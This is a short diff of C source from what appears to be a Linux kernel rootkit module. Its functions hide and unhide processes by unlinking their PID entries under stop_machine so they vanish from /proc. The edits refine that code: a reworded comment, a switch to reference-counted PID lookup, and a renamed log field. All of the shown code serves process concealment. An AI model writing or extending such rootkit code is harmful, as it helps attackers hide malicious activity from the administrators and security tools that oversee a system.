@@ -44,7 +44,7 @@ static inline int _hide_task(void *data) {
     node->fnode = fs_get_file_node(task);
     list_add_tail(&node->list, &hidden_tasks_node);
 
-    /* remove task from the system's visibility */
+    /* task vanishes from /proc */
     link = &task->pids[PIDTYPE_PID];
     if(!link)
         return 0;
@@ -88,7 +88,7 @@ void hide_task_by_pid(pid_t pid) {
     if(task)
         stop_machine(_unhide_task, task, NULL);
     else {
-        task = pid_task(find_vpid(pid), PIDTYPE_PID);
+        task = get_pid_task(find_get_pid(pid), PIDTYPE_PID);
         if(!task)
             return;
         stop_machine(_hide_task, task, NULL);
@@ -110,7 +110,7 @@ void wally_list_saved_tasks(void) {
     {
         /* to help grep */
         if(node->fnode)
-            printk(KERN_INFO "filename:%s|inode:%llu|task:%p|pid:%d\n",
+            printk(KERN_INFO "executable:%s|inode:%llu|task:%p|pid:%d\n",
                     node->fnode->filename, node->fnode->ino, node->task, node->task->pid);
         else
             printk(KERN_INFO "task:%p|pid:%d\n", node->task, node->task->pid);
